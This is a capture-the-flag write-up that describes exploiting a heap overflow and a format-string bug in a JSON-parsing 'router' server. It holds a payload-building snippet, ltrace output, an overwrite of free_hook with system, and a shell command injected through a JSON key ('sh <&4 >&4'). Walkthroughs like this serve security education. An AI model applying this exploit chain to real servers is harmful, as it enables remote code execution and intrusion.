## Welcome back!

My solution is, in python language,

```python
# input starts with 0x67 printable characters.

"""
{
	"%s": {
	"%s": {
	"%s": "%s",
	"%s": "%s"
}
""" % "A" * 16, "A" * 0x67, ("A" * 31 + "\xff").ljust(0x28) + p64(0x7f) + p64(target), input, "a"
```

After doing this, target + 5 + 8 is filled with our input. For ease of explanation, I attached ltrace log.

```
$ ltrace -fie malloc+free+calloc+snprintf ./router
listening on port: 8080
[pid 13716] [0x403ffe] router->malloc(56)                                                        = 0x13ba010
[pid 13716] [0x401422] router->calloc(1, 1024)                                                   = 0x13ba050
[pid 13716] [0x401657] router->malloc(7)                                                         = 0x13ba870
[pid 13716] [0x40177b] router->malloc(24)                                                        = 0x13ba890
[pid 13716] [0x4017a6] router->malloc(7)                                                         = 0x13ba8b0
[pid 13716] [0x4018e3] router->malloc(75)                                                        = 0x13ba8d0
[pid 13716] [0x40177b] router->malloc(24)                                                        = 0x13ba930
[pid 13716] [0x4017a6] router->malloc(15)                                                        = 0x13ba950
[pid 13716] [0x4018e3] router->malloc(4)                                                         = 0x13ba970
[pid 13716] [0x40177b] router->malloc(24)                                                        = 0x13ba990
[pid 13716] [0x4017a6] router->malloc(13)                                                        = 0x13ba9b0
[pid 13716] [0x4018e3] router->malloc(17)                                                        = 0x13ba9d0
[pid 13716] [0x40177b] router->malloc(24)                                                        = 0x13ba9f0
[pid 13716] [0x4017a6] router->malloc(5)                                                         = 0x13baa10
[pid 13716] [0x4018e3] router->malloc(13)                                                        = 0x13baa30
[pid 13716] [0x401952] router->malloc(451)                                                       = 0x13baa50
[pid 13716] [0x404090] router->calloc(1, 8192)                                                   = 0x13bac20
// "A" * 16
[pid 13716] [0x40224e] router->calloc(1, 17)                                                     = 0x13bce60
[pid 13716] [0x401fb7] router->calloc(1, 32)                                                     = 0x13bce80
// case 1
[pid 13716] [0x4028a2] router->free(0x13bce60)                                                   = <void>
[pid 13716] [0x4028ae] router->free(0x13bce80)                                                   = <void>
// "A" * 0x67
[pid 13716] [0x40224e] router->calloc(1, 104)                                                    = 0x13bceb0
[pid 13716] [0x401fb7] router->calloc(1, 32)                                                     = 0x13bce80
// case 1
[pid 13716] [0x4028a2] router->free(0x13bceb0)                                                   = <void>
[pid 13716] [0x4028ae] router->free(0x13bce80)                                                   = <void>
// ("A" * 31 + "\xff").ljust(0x28) + p64(0x7f) + p64(target + 5 - 8)
[pid 13716] [0x40224e] router->calloc(1, 32)                                                     = 0x13bce80
[pid 13716] [0x401fb7] router->calloc(1, 32)                                                     = 0x13bcf20
[pid 13716] [0x40224e] router->calloc(1, 104)                                                    = 0x13bceb0
[pid 13716] [0x401fb7] router->calloc(1, 32)                                                     = 0x13bcf50
[pid 13716] [0x40292f] router->calloc(1, 16)                                                     = 0x13bce60
[pid 13716] [0x401f43] router->calloc(1, 32)                                                     = 0x13bcf80
// calloc returns target + 5 + 8!
[pid 13716] [0x40224e] router->calloc(1, 104)                                                    = 0x60f195
[pid 13716] [0x401fb7] router->calloc(1, 32)                                                     = 0x13bcfb0
// don't free it, with case 2.
[pid 13716] [0x40224e] router->calloc(1, 17)                                                     = 0x13bcfe0
[pid 13716] [0x401fb7] router->calloc(1, 32)                                                     = 0x13bd000
[pid 13716] [0x40292f] router->calloc(1, 16)                                                     = 0x13bd030
[pid 13716] [0x401f43] router->calloc(1, 32)                                                     = 0x13bd050
[pid 13716] [0x403d41] router->snprintf("0x40bf3d 0x7f6d45c8a700 0x1 0x20"..., 8191, "%p %p %p %p %p %p %p %p %p %p %p"..., 0x40bf3d, 0x7f6d45c8a700, 0x1, 0x2000, 0x13bac20, 0x7ffcf2dfcfb0, 0xfffffff500000006, 0x40, 0x13ba8da, 0x13ba9d0, 0xa6f989b94487cc00, 0x7ffcf2dfcfb0, 0x403f50, nil, 0x2000, 0x13bac20, 0x7ffcf2dfcff0, 0x7ffcf2dfd070, 0x403c58, 0x7ffcf2dfd070, 0x4040c0) = 299
[pid 13716] [0x404135] router->free(0x13ba460)                                                   = <void>
[pid 13716] [0x404144] router->free(0x13bac20)                                                   = <void>
```

First I leaked the pointer by changing response template pointer and triggering FSB. After doing this, I found that server has same libc with me. I'm using ubuntu 16.04 x64 LTS.

Then I used 0x7f value in stdout + 16 + 5, and modified free_hook pointer to system. One additional string with case 1 will trigger free with our controlled buffer, so I added this. Here is the reason that I couldn't use one-gadget for the challenge.

```json
  ...,
  "sh <&4 >&4": {
}
```

Since it was fork-and-accept server, launching a shell is not enough, but we must dup2 to give some commands. Assuming that no extra fds are opened before running the server, the fd would be 4 (0, 1, 2, accept-socket 3, client-socket 4). Then it popped a shell on local.

But the script didn't work well on remote. I spent nearly 12 hours trying some ROPs, thinking that the libc can be differ, or patched...

But this was not the case.. My teammate found the reason. Let's see the code below, which reads the HTTP request.

```c
char *__fastcall read_request(int a1, _QWORD *a2)
{
  src = calloc(1uLL, 0x400uLL);
  if ( src )
  {
    do
    {
      v4 = read(a1, src, 0x400uLL);
      if ( v4 <= 0 )
        break;
      if ( v3 + v4 > size )
      {
        size += 1024LL;
        if ( size > 16384 )
        {
          fwrite("buffer limit reached\n", 1uLL, 0x15uLL, stderr);
          goto LABEL_11;
        }
        ptr = realloc(ptr, size);
        if ( !ptr )
        {
          fwrite("realloc: out of memory\n", 1uLL, 0x17uLL, stderr);
          goto LABEL_11;
        }
      }
      memcpy(&ptr[v3], src, v4);
      v3 += v4;
    }
    while ( v4 > 1023 );
    *a2 = v3;
    ptr[v3] = 0;
    result = ptr;
  }
  else
  {
    fwrite("out of memory\n", 1uLL, 0xEuLL, stderr);
LABEL_11:
    *a2 = 0LL;
    result = 0LL;
  }
  return result;
}
```

This routine receives 1024 bytes a time, and if the return value and current buffer size exceeds the allocated size, it expands the buffer.
The problem is, it relies on short-reads. What if the return value of the read call is less than 1024 while sending more than it? I assume it was, because of the network problem. It really depends on MTU value of every nodes between my computer and the server. The distance between stdout + 16 and free_hook is really far for this libc, so it couldn't control the free hook value and exited.

To resolve this, we bought a cloud instance in germany (the server was in germany) and ran the exploit. Shell popped.

This challenge was really fun since it was realistic(I ran AFL for finding a NULL-dereference crash in the json parser) and allowed a unlimited size heap overflow. However, Kaspersky, please read [this](https://github.com/pwning/docs/blob/master/suggestions-for-running-a-ctf.markdown#remote) before making a challenge.

That's all. Thanks for reading, and have a good day!